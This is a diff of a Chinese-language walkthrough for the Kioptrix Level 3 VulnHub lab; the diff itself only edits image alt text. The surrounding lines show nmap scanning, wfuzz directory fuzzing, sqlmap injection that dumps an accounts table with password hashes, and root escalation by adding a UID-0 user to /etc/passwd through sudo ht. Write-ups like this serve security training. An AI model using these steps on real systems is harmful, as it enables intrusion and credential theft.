@@ -67,7 +67,7 @@ Source: http://www.kioptrix.com/blog/?p=358
 nmap -sP 192.168.141.0/24
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix3/1.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix3/1.png)
 
 排除法,去掉自己、宿主机、网关, `192.168.141.146` 就是目标了
 
@@ -76,27 +76,27 @@ nmap -sP 192.168.141.0/24
 nmap -T5 -A -v -p- 192.168.141.146
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix3/2.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix3/2.png)
 
 SSH 和 web,从 web 先入手,先按照要求修改 hosts 文件,访问 web 看看
 ```bash
 echo "192.168.141.146 kioptrix3.com" >> /etc/hosts
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix3/3.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix3/3.png)
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix3/4.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix3/4.png)
 
 看上去是用 lotusCMS 搭建的,先目录扫描看下
 ```
 wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://kioptrix3.com/FUZZ | grep 301
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix3/5.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix3/5.png)
 
 有个 phpmyadmin,访问看看
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix3/6.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix3/6.png)
 
 2.11.3 版本有个 CVE-2009-1151,实际测试并不能利用成功,没办法了,从其他地方入手吧
 
@@ -108,9 +108,9 @@ wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://kioptrix3.com/FUZZ 
 
 发现这里可以进行排序,对 id 参数测试 SQL 注入
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix3/7.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix3/7.png)
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix3/8.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix3/8.png)
 
 这里可能存在 SQL 注入,直接 Sqlmap 跑起来
 ```
@@ -119,7 +119,7 @@ sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=1%27 -D gallery --tables
 sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=1%27 -D gallery -T dev_accounts --dump
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix3/9.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix3/9.png)
 
 ```
 | 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   |
@@ -138,14 +138,14 @@ dreg 账号实在是没什么可利用的，loneferret 账号下有一些利用�
 sudo -l
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix3/10.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix3/10.png)
 
 ht 是一个文本编辑器,尝试用它来提权
 ```
 sudo ht /etc/passwd
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix3/11.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix3/11.png)
 
 提示我需要设置 xtrem-color
 ```
@@ -153,20 +153,20 @@ export TERM=xterm-color
 sudo ht /etc/passwd
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix3/12.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix3/12.png)
 
 实际上这里我是一脸懵逼的,这玩意咋整啊
 
 按 F3,打开文件,输入 /etc/passwd ,回车
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix3/13.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix3/13.png)
 
 最末尾加上
 ```
 test:sXuCKi7k3Xh/s:0:0::/root:/bin/bash
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix3/14.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix3/14.png)
 
 按 F10,退出,记得保存
 ```
@@ -174,6 +174,6 @@ su test
 toor
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix3/15.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix3/15.png)
 
 提权成功,感谢 Kioptrix Team 制作靶机
